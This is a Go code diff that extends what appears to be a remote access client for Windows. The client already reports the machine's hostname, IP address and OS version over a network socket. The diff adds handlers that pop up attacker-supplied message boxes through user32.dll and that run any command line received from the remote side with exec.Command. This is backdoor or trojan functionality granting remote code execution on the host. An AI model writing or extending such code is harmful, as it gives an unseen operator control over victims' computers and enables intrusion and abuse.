@@ -5,9 +5,12 @@ import (
 	"log"
 	"net"
 	"os"
+	"os/exec"
 	"runtime"
 	"strconv"
 	"strings"
+	"syscall"
+	"unsafe"
 
 	"golang.org/x/sys/windows/registry"
 )
@@ -62,7 +65,27 @@ func handleClient(conn net.Conn) {
 			parameters := []string{command, hostname, ipAddress, os_version}
 
 			send(strings.Join(parameters, DELIM), conn)
+		case "show_messagebox":
+			fmt.Println(message)
+			message, _ := syscall.UTF16PtrFromString(string(split_message[1]))
+			title, _ := syscall.UTF16PtrFromString(string(split_message[2]))
+			buttons, _ := strconv.Atoi(split_message[3])
+			icon, _ := strconv.Atoi(split_message[4])
+
+			mb := uintptr(icon) | uintptr(buttons)
+
+			go syscall.NewLazyDLL("user32.dll").NewProc("MessageBoxW").Call(
+				0,
+				uintptr(unsafe.Pointer(message)),
+				uintptr(unsafe.Pointer(title)),
+				mb,
+			)
+		case "run_process":
+			process_name := string(split_message[1])
+			params := strings.Split(process_name, " ")
+			go exec.Command(params[0], params[1:]...).Output()
 		}
+
 	}
 }
 
